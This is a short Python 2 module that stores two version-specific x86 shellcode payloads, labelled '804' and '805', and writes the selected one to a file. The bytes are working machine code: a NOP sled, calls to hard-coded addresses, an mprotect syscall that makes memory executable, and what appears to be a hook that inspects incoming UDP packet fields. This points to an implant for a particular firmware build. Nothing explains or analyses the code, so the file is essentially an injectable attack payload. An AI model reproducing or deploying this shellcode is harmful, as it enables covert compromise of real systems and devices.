# -*- coding:utf-8 -*-
#!/usr/bin/python

class ShellcodeCollect(object):
    shellcode_804 = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xBE\x60\xCE\x9B\x08\x68\x00\x00\x10\x00\xFF\xD6\x8B\xF8\xE8\x00\x00\x00\x00\x58\x83\xC0\x4D\x89\x38\xE8\x00\x00\x00\x00\x58\xBE\xB0\xBB\x16\x09\x6A\x75\x83\xC0\x47\x50\x57\xFF\xD6\xB8\x7D\x00\x00\x00\xBB\x00\x00\x66\x08\xB9\x00\x10\x00\x00\xBA\x07\x00\x00\x00\xCD\x80\xBE\xB0\xBB\x16\x09\xE8\x00\x00\x00\x00\x58\x6A\x06\x83\xC0\x12\x50\x68\x8D\x0C\x66\x08\xFF\xD6\x83\xC4\x1C\xC3\x68\x44\x33\x22\x11\xC3\x8B\x50\x0C\x89\x55\xE8\x60\xE8\x07\x00\x00\x00\x61\x68\x93\x0C\x66\x08\xC3\xE8\x00\x00\x00\x00\x5A\x83\xC2\x64\x8B\x75\xF8\x8B\x7D\x10\x80\x7E\x0C\x81\x75\x03\x83\xC6\x04\x83\x3A\x00\x74\x0B\x57\x56\x8B\xC2\xFF\xD0\x83\xC4\x08\xEB\x39\x66\x83\x7E\x0C\x08\x75\x32\x80\x7E\x17\x11\x75\x2C\x66\x83\x7E\x24\x00\x75\x25\x66\x83\x7E\x22\x00\x75\x1E\x33\xDB\x8A\x5E\x27\x8A\x7E\x26\x66\x83\xEB\x08\x53\x8B\xCE\x83\xC1\x2A\x51\x52\xB8\xB0\xBB\x16\x09\xFF\xD0\x83\xC4\x0C\xC3"
    shellcode_805 = "\xBE\xE0\x68\x9E\x08\x68\x00\x00\x10\x00\xFF\xD6\x8B\xF8\xE8\x00\x00\x00\x00\x58\x83\xC0\x4D\x89\x38\xE8\x00\x00\x00\x00\x58\xBE\x60\x74\x1B\x09\x6A\x75\x83\xC0\x47\x50\x57\xFF\xD6\xB8\x7D\x00\x00\x00\xBB\x00\xA0\x67\x08\xB9\x00\x10\x00\x00\xBA\x07\x00\x00\x00\xCD\x80\xBE\x60\x74\x1B\x09\xE8\x00\x00\x00\x00\x58\x6A\x06\x83\xC0\x12\x50\x68\xBD\xA6\x67\x08\xFF\xD6\x83\xC4\x1C\xC3\x68\x44\x33\x22\x11\xC3\x8B\x50\x0C\x89\x55\xE8\x60\xE8\x07\x00\x00\x00\x61\x68\xC3\xA6\x67\x08\xC3\xE8\x00\x00\x00\x00\x5A\x83\xC2\x64\x8B\x75\xF8\x8B\x7D\x10\x80\x7E\x0C\x81\x75\x03\x83\xC6\x04\x83\x3A\x00\x74\x0B\x57\x56\x8B\xC2\xFF\xD0\x83\xC4\x08\xEB\x39\x66\x83\x7E\x0C\x08\x75\x32\x80\x7E\x17\x11\x75\x2C\x66\x83\x7E\x24\x00\x75\x25\x66\x83\x7E\x22\x00\x75\x1E\x33\xDB\x8A\x5E\x27\x8A\x7E\x26\x66\x83\xEB\x08\x53\x8B\xCE\x83\xC1\x2A\x51\x52\xB8\x60\x74\x1B\x09\xFF\xD0\x83\xC4\x0C\xC3"
    #shellcode_805 = "\xC3"

    @classmethod
    def get_shellcode_with_ver(cls, ver):
        if ver == "804":
            return cls.shellcode_804
        elif ver == "805":
            return cls.shellcode_805
        else:
            return None

    @classmethod
    def output_shellcode_to_file(cls, ver, outPath):
        try:
            outFile = open(outPath, "wb")
            outFile.write(cls.get_shellcode_with_ver(ver))
            outFile.close()
        except Exception, e:
            print "[-] Shellcode output failed. Exception: %s" % str(e)
            return False

        return True